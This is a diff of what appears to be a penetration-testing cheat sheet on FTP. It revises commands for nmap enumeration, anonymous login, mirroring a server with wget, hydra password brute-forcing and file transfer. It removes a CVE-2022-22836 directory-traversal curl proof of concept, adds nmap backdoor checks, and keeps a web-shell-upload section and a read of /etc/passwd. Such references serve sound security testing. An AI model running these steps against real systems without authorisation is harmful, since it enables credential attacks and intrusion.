@@ -1225,30 +1225,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#known-vulnerabilities" class="md-nav__link">
+  <a href="#version-specific-checks" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Known Vulnerabilities
+        Version-Specific Checks
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Known Vulnerabilities">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cve-2022-22836" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CVE-2022-22836
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -5468,30 +5451,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#known-vulnerabilities" class="md-nav__link">
+  <a href="#version-specific-checks" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Known Vulnerabilities
+        Version-Specific Checks
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Known Vulnerabilities">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cve-2022-22836" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CVE-2022-22836
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -5522,34 +5488,37 @@
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>--script<span class="w"> </span>ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor<span class="w"> </span><span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>--script<span class="w"> </span>ftp-anon,ftp-syst<span class="w"> </span><span class="nv">$IP</span>
 </code></pre></div>
 <hr />
 <h2 id="ftp-login-syntax">FTP Login Syntax<a class="headerlink" href="#ftp-login-syntax" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span>user@IP
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span><span class="nv">$IP</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>ftp&gt;<span class="w"> </span>user<span class="w"> </span>USERNAME
 </code></pre></div>
 <hr />
 <h2 id="anonymous-login">Anonymous Login<a class="headerlink" href="#anonymous-login" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ftp<span class="w"> </span>anonymous@<span class="nv">$IP</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># Password: anonymous OR anon</span>
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>ftp&gt;<span class="w"> </span>ls<span class="w"> </span>-la
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>ftp&gt;<span class="w"> </span>ls<span class="w"> </span>-laR<span class="w">       </span><span class="c1"># recursive listing</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ftp<span class="w"> </span><span class="nv">$IP</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ftp&gt;<span class="w"> </span>user<span class="w"> </span>anonymous
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># Use a benign email address as the password when prompted.</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>ftp&gt;<span class="w"> </span>ls
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>ftp&gt;<span class="w"> </span>dir
 </code></pre></div>
 <p>Mirror the entire directory without interacting manually:
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>wget<span class="w"> </span>-m<span class="w"> </span>--no-passive<span class="w"> </span>ftp://anonymous@<span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>wget<span class="w"> </span>--mirror<span class="w"> </span>--no-passive<span class="w"> </span><span class="s2">&quot;ftp://anonymous:anonymous@</span><span class="nv">$IP</span><span class="s2">/&quot;</span>
 </code></pre></div></p>
 <hr />
 <h2 id="brute-force">Brute Force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="w"> </span>ftp://<span class="nv">$IP</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ftp://<span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hydra<span class="w"> </span>-C<span class="w"> </span>approved-defaults.txt<span class="w"> </span>ftp://<span class="nv">$IP</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ftp://<span class="nv">$IP</span>
 </code></pre></div>
 <hr />
 <h2 id="file-transfer">File Transfer<a class="headerlink" href="#file-transfer" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ftp&gt;<span class="w"> </span>get<span class="w"> </span>filename<span class="w">        </span><span class="c1"># download</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>ftp&gt;<span class="w"> </span>put<span class="w"> </span>filename<span class="w">        </span><span class="c1"># upload</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ftp&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>binary<span class="w">         </span><span class="c1"># switch to binary mode for non-text files</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ftp&gt;<span class="w"> </span>binary
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>ftp&gt;<span class="w"> </span>get<span class="w"> </span>REMOTE_FILE<span class="w"> </span>LOCAL_FILE
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ftp&gt;<span class="w"> </span>put<span class="w"> </span>LOCAL_FILE<span class="w"> </span>REMOTE_FILE
 </code></pre></div>
+<p>Use binary mode before transferring archives, executables, images, or other non-text files.</p>
 <hr />
 <h2 id="web-shell-upload">Web Shell Upload<a class="headerlink" href="#web-shell-upload" title="Permanent link">&para;</a></h2>
 <p>If the FTP root maps to a web-accessible directory (<code>/var/www/html</code>):</p>
@@ -5570,15 +5539,9 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>cat<span class="w"> </span>/etc/vsftpd.conf
 <a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>grep<span class="w"> </span>ftp<span class="w"> </span>/etc/passwd
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>FTP is rarely exposed externally on modern networks, when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.</p>
-</div>
-<hr />
-<h2 id="known-vulnerabilities">Known Vulnerabilities<a class="headerlink" href="#known-vulnerabilities" title="Permanent link">&para;</a></h2>
-<h3 id="cve-2022-22836">CVE-2022-22836<a class="headerlink" href="#cve-2022-22836" title="Permanent link">&para;</a></h3>
-<p>CoreFTP Server version 727 and below is vulnerable to <a href="https://www.exploit-db.com/exploits/50652">CVE-2022-22836</a>, an authenticated exploit that allows for file directory traversal using a simple cURL request.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
+<h2 id="version-specific-checks">Version-Specific Checks<a class="headerlink" href="#version-specific-checks" title="Permanent link">&para;</a></h2>
+<p>For matching banners, Nmap includes targeted checks for the compromised <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">vsftpd 2.3.4 distribution (CVE-2011-2523)</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-20103">ProFTPD 1.3.3c distribution (CVE-2010-20103)</a>. These CVEs apply only to specific malicious source distributions, not every server reporting the same version string. Treat a banner match as a lead rather than proof.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>--script<span class="w"> </span>ftp-vsftpd-backdoor,ftp-proftpd-backdoor<span class="w"> </span><span class="nv">$IP</span>
 </code></pre></div>
 
 
